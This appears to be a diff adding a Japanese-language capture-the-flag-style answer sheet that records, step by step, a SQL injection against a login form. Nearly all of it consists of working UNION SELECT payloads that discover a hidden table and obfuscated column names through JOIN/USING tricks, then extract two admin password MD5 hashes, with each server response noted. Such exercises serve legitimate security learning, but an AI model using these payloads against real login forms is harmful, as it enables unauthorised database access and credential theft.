@@ -1,0 +1,42 @@
+adminユーザのパスワード：
+パスワードを取得した手順：
+Usernameに以下を入力し、captchaを入力
+' UNION SELECT name FROM sqlite_sequence;--
+
+テーブル名は、ourcustomertable
+
+Usernameに以下を入力し、captchaを入力
+' UNION SELECT * FROM ourcustomertable JOIN ourcustomertable;
+
+一つ目のカラム名は、id
+
+Usernameに以下を入力し、captchaを入力
+' UNION SELECT * FROM ourcustomertable JOIN ourcustomertable USING(id);
+
+ユーザ名のカラム名は、username___Aeyo6fah4iep_
+
+Usernameに以下を入力し、captchaを入力
+' UNION SELECT * FROM ourcustomertable JOIN ourcustomertable USING(id,username___Aeyo6fah4iep_);
+
+パスワードのカラム名は、userpwd____veryrandomstrings__
+
+Usernameに以下を入力し、captchaを入力
+' UNION SELECT userpwd____veryrandomstrings__ FROM ourcustomertable WHERE username___Aeyo6fah4iep_ LIKE '%admin%' LIMIT 1 OFFSET 1;--
+
+Hello, c23cc813361e0f1d723c4062217e08a9 と表示される
+
+Usernameに以下を入力し、captchaを入力
+' UNION SELECT userpwd____veryrandomstrings__ FROM ourcustomertable WHERE username___Aeyo6fah4iep_ LIKE '%admin%' LIMIT 1;--
+
+Hello, 788073cefde4b240873e1f52f5371d7d と表示される
+
+Usernameに以下を入力し、captchaを入力
+' UNION SELECT userpwd____veryrandomstrings__ FROM ourcustomertable WHERE username___Aeyo6fah4iep_ LIKE '%admin%' LIMIT 1 OFFSET 2;--
+
+Login failed... と表示される
+
+
+したがって、adminユーザは2つあり、次の２つが、パスワードの md5 のハッシュ値である。
+c23cc813361e0f1d723c4062217e08a9
+788073cefde4b240873e1f52f5371d7d
+
